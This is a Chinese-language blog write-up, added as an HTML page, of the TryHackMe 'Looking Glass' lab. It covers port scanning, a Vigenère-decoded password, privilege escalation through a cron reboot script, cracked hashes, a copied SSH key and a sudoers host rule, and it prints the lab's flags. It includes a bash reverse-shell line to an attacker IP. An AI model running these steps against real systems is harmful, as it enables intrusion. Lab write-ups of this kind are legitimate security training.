@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>Looking Glass - v2ish1yan`s blog</title>
+
+  
+    <meta name="description" content="0x00 linux提权 维吉尼亚密码  0x01 端口扫描直接访问网址发现访问不了，尝试使用nmap扫一波端口 1nmap -sC -sV   10.10.238.101    -sC 使用默认脚本 -sV 显示服务版本信息  结果 image-20230112205335633  可以发现不仅22端口开了ssh服务，从9000到13783端口都有ssh服务 尝试连接9001端口 1ssh -p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Looking Glass">
+<meta property="og:url" content="http://example.com/2023/07/03/%E9%9D%B6%E6%9C%BA/THM_Looking%20Glasses/index.html">
+<meta property="og:site_name" content="v2ish1yan&#96;s blog">
+<meta property="og:description" content="0x00 linux提权 维吉尼亚密码  0x01 端口扫描直接访问网址发现访问不了，尝试使用nmap扫一波端口 1nmap -sC -sV   10.10.238.101    -sC 使用默认脚本 -sV 显示服务版本信息  结果 image-20230112205335633  可以发现不仅22端口开了ssh服务，从9000到13783端口都有ssh服务 尝试连接9001端口 1ssh -p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122053694.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122111046.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122112320.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122125176.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122127686.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122208657.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122214270.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122356285.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301130009588.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301130013202.png">
+<meta property="article:published_time" content="2023-07-03T08:59:13.293Z">
+<meta property="article:modified_time" content="2023-07-03T08:59:13.348Z">
+<meta property="article:author" content="v2ish1yan">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="维吉尼亚密码">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122053694.png">
+  
+  
+  
+  <meta name="keywords" content="Linux,维吉尼亚密码">
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120002492.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120001591.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">v2ish1yan`s blog</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/links/">友链</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">Looking Glass</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">0x01 端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E8%A7%A3%E5%AF%86"><span class="toc-text">0x02 维吉尼亚解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%8F%90%E6%9D%83%E8%87%B3tweedledum"><span class="toc-text">0x03 提权至tweedledum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%8F%90%E6%9D%83%E8%87%B3humptydumpty"><span class="toc-text">0x04 提权至humptydumpty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E4%BD%BF%E7%94%A8ssh%E7%A7%81%E9%92%A5%E6%8F%90%E6%9D%83%E8%87%B3alice"><span class="toc-text">0x05 使用ssh私钥提权至alice</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%8F%90%E6%9D%83%E8%87%B3root"><span class="toc-text">0x06 提权至root</span></a></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Tryhackme/">Tryhackme</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-07-03T08:59:13.293Z">2023-07-03</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>Looking Glass</span></h1>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ul>
+<li>linux提权</li>
+<li>维吉尼亚密码</li>
+</ul>
+<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p>直接访问网址发现访问不了，尝试使用nmap扫一波端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV   10.10.238.101 </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-sC 使用默认脚本</li>
+<li>-sV 显示服务版本信息</li>
+</ul>
+<p>结果</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122053694.png" alt="image-20230112205335633" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230112205335633</span></div></div>
+
+<p>可以发现不仅22端口开了ssh服务，从9000到13783端口都有ssh服务</p>
+<p>尝试连接9001端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 9001 <span class="built_in">test</span>@10.10.238.101 </span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果出现下面的报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unable to negotiate with 10.10.238.101 port 9001: no matching host key <span class="built_in">type</span> found. Their offer: ssh-rsa</span><br></pre></td></tr></table></figure>
+
+<p>就在&#x2F;etc&#x2F;ssh&#x2F;ssh_config下面加上<code>HostkeyAlgorithms +ssh-rsa</code></p>
+<p>会发现返回Lower</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122111046.png" alt="image-20230112211126993" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230112211126993</span></div></div>
+
+<p>那换一个大的端口呢</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 13783 <span class="built_in">test</span>@10.10.238.101</span><br></pre></td></tr></table></figure>
+
+<p>会返回Higher</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122112320.png" alt="image-20230112211211293" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230112211211293</span></div></div>
+
+<p>这就很明显了，让我们找到对的端口来连接，就用二分法来找吧</p>
+<p>最后找到正确端口<code>10412</code></p>
+<p>也可以使用bash脚本进行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 9000 13783); <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;connecting to port <span class="variable">$i</span>&quot;</span>; ssh -o <span class="string">&#x27;LogLevel=ERROR&#x27;</span> -o <span class="string">&#x27;StrictHostKeyChecking=no&#x27;</span> -p <span class="variable">$i</span> <span class="built_in">test</span>@10.10.2.112;<span class="keyword">done</span> | grep -vE <span class="string">&#x27;Lower|Higher&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#LogLevel=ERROR 设置安全等级为最低级，这样就不会显示报错消息</span></span><br><span class="line"><span class="comment">#StrictHostKeyChecking=no  不检查密钥文件</span></span><br><span class="line"><span class="comment"># -v 查找不包含目标字符串的内容  -E 使用 | 代表或</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-维吉尼亚解密"><a href="#0x02-维吉尼亚解密" class="headerlink" title="0x02 维吉尼亚解密"></a>0x02 维吉尼亚解密</h2><p>他返回了下面的内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">You<span class="string">&#x27;ve found the real service.</span></span><br><span class="line"><span class="string">Solve the challenge to get access to the box</span></span><br><span class="line"><span class="string">Jabberwocky</span></span><br><span class="line"><span class="string">&#x27;</span>Mdes mgplmmz, cvs alv lsmtsn aowil</span><br><span class="line">Fqs ncix hrd rxtbmi bp bwl arul;</span><br><span class="line">Elw bpmtc pgzt alv uvvordcet,</span><br><span class="line">Egf bwl qffl vaewz ovxztiql.</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;Fvphve ewl Jbfugzlvgb, ff woy!</span></span><br><span class="line"><span class="string">Ioe kepu bwhx sbai, tst jlbal vppa grmjl!</span></span><br><span class="line"><span class="string">Bplhrf xag Rjinlu imro, pud tlnp</span></span><br><span class="line"><span class="string">Bwl jintmofh Iaohxtachxta!&#x27;</span></span><br><span class="line"></span><br><span class="line">Oi tzdr hjw oqzehp jpvvd tc oaoh:</span><br><span class="line">Eqvv amdx ale xpuxpqx hwt oi jhbkhe--</span><br><span class="line">Hv rfwmgl wl fp moi Tfbaun xkgm,</span><br><span class="line">Puh jmvsd lloimi bp bwvyxaa.</span><br><span class="line"></span><br><span class="line">Eno pz io yyhqho xyhbkhe wl sushf,</span><br><span class="line">Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,</span><br><span class="line">Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,</span><br><span class="line">Pud cykdttk ej ba gaxt!</span><br><span class="line"></span><br><span class="line">Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh</span><br><span class="line">Ewl vpvict qseux dine huidoxt-achgb!</span><br><span class="line">Al peqi pt eitf, ick azmo mtd wlae</span><br><span class="line">Lx ymca krebqpsxug cevm.</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;Ick lrla xhzj zlbmg vpt Qesulvwzrr?</span></span><br><span class="line"><span class="string">Cpqx vw bf eifz, qy mthmjwa dwn!</span></span><br><span class="line"><span class="string">V jitinofh kaz! Gtntdvl! Ttspaj!&#x27;</span></span><br><span class="line">Wl ciskvttk me apw jzn.</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;Awbw utqasmx, tuh tst zljxaa bdcij</span></span><br><span class="line"><span class="string">Wph gjgl aoh zkuqsi zg ale hpie;</span></span><br><span class="line"><span class="string">Bpe oqbzc nxyi tst iosszqdtz,</span></span><br><span class="line"><span class="string">Eew ale xdte semja dbxxkhfe.</span></span><br><span class="line"><span class="string">Jdbr tivtmi pw sxderpIoeKeudmgdstd</span></span><br></pre></td></tr></table></figure>
+
+<p>Jabberwocky</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122125176.png" alt="image-20230112212524132" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230112212524132</span></div></div>
+
+<p>这个看起来就是将字符打乱了，可能是维基利亚密码，使用这个网站进行解密【他会自动爆破密钥】</p>
+<p><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">vigenere-solver</a></p>
+<p>得到密码<code>bewareTheJabberwock</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122127686.png" alt="image-20230112212709654" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230112212709654</span></div></div>
+
+<p>然后他会告诉我们用户和密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jabberwock:SubjectsWatchingShynessProvided</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jabberwock@10.10.238.101</span><br></pre></td></tr></table></figure>
+
+<p>进去后查看user.txt，得到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;32a911966cab2d643f5d57d9e0173d56&#123;mht</span><br></pre></td></tr></table></figure>
+
+<p>将其逆序输出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#125;32a911966cab2d643f5d57d9e0173d56&#123;mht&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[::-<span class="number">1</span>])</span><br><span class="line">&gt;thm&#123;65d3710e9d75d5f346d2bac669119a23&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-提权至tweedledum"><a href="#0x03-提权至tweedledum" class="headerlink" title="0x03 提权至tweedledum"></a>0x03 提权至tweedledum</h2><p>然后这里有两个文件<code>poem.txt</code>和<code>twasBrillig.sh</code>，这个脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wall $(<span class="built_in">cat</span> /home/jabberwock/poem.txt)</span><br></pre></td></tr></table></figure>
+
+<p>就是用来输出诗句的</p>
+<p>然后再看看当前用户可以不用密码执行哪些其他用户的命令<code>sudo -l -l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sudoers entry:                                                                                                                                                                                   </span><br><span class="line">    RunAsUsers: root                                                                                                                                                                             </span><br><span class="line">    Options: !authenticate                                                                                                                                                                       </span><br><span class="line">    Commands:                                                                                                                                                                                    </span><br><span class="line">        /sbin/reboot     </span><br></pre></td></tr></table></figure>
+
+<p>可以以root的身份执行重启命令，他为什么会给重启，可以去看看cron定时任务，可能会有相关信息</p>
+<p>查看<code>etc/crontab</code>，发现有这样一段指令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@reboot tweedledum bash /home/jabberwock/twasBrillig.sh</span><br></pre></td></tr></table></figure>
+
+<p>没当机器重启的时候，就会以tweedledum的身份去执行<code>twasBrillig.sh</code>，我们可以修改这个脚本的内容，然后重启这个机器进行提权</p>
+<p><code>twasBrillig.sh</code>修改为反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27; bash -i &amp;&gt; /dev/tcp/10.18.104.32/9999 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /sbin/reboot</span><br></pre></td></tr></table></figure>
+
+<p>来重启服务器</p>
+<p>攻击机开启监听，等一段时间后就可以得到shell</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122208657.png" alt="image-20230112220858586" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230112220858586</span></div></div>
+
+<h2 id="0x04-提权至humptydumpty"><a href="#0x04-提权至humptydumpty" class="headerlink" title="0x04 提权至humptydumpty"></a>0x04 提权至humptydumpty</h2><p>在<code>/home/tweedledum</code>发现了<code>humptydumpty.txt</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9</span><br><span class="line">7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed</span><br><span class="line">28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624</span><br><span class="line">b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f</span><br><span class="line">fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6</span><br><span class="line">b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0</span><br><span class="line">5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8</span><br><span class="line">7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b</span><br></pre></td></tr></table></figure>
+
+<p>貌似为hash值，使用这个网站进行解密<a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a>，得到</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122214270.png" alt="image-20230112221453208" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230112221453208</span></div></div>
+
+<p>最下面那个不是hash，用16进制解码一下，得到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the password is zyxwvutsrqponmlk</span><br></pre></td></tr></table></figure>
+
+<p>看来这个就是用户<code>humptydumpty</code>的密码了,切换用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su humptydumpty</span><br></pre></td></tr></table></figure>
+
+<p>他会报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su: must be run from a terminal</span><br></pre></td></tr></table></figure>
+
+<p>使用python的pty模块，执行以下命令，获取伪终端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-使用ssh私钥提权至alice"><a href="#0x05-使用ssh私钥提权至alice" class="headerlink" title="0x05 使用ssh私钥提权至alice"></a>0x05 使用ssh私钥提权至alice</h2><p>alice用户的.ssh目录可以访问，虽然不能列出文件，但是可以打印alice的私钥文件<code>id_rsa</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122356285.png" alt="image-20230112235606214" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230112235606214</span></div></div>
+
+<p>复制到本地，保存在一个文件中，并赋予相应权限,只有</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 key</span><br></pre></td></tr></table></figure>
+
+<p>然后使用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i key alice@10.10.2.112 </span><br></pre></td></tr></table></figure>
+
+<p>来登录alice用户</p>
+<h2 id="0x06-提权至root"><a href="#0x06-提权至root" class="headerlink" title="0x06 提权至root"></a>0x06 提权至root</h2><p>使用linepeas.sh来找可能存在提权的地方，这个就攻击机开个服务，让目标机下载就行</p>
+<p>在<code>/etc/sudoers.d/alice</code>存在对alice的sudo规则,当<code>sudo -l</code>需要密码而不知道的时候可以看看这里的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alice ssalg-gnikool = (root) NOPASSWD: /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>下面的是sudoers文件的语法</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301130009588.png" alt="img" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">img</span></div></div>
+
+<p>这里说明alice只能在ssalg-gnikool主机上才能使用root用户执行&#x2F;bin&#x2F;bash</p>
+<p>使用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -h  ssalg-gnikool -u root /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>-h 可以指定主机</p>
+<p>虽然没有解析成功，但是还是到了root权限</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301130013202.png" alt="image-20230113001330163" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230113001330163</span></div></div>
+
+<p>最后在&#x2F;root得到root.txt，还是要逆序一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&#x27;&#125;f3dae6dec817ad10b750d79f6b7332cb&#123;mht&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[::-<span class="number">1</span>])</span><br><span class="line">&gt;thm&#123;bc2337b6f97d057b01da718ced6ead3f&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
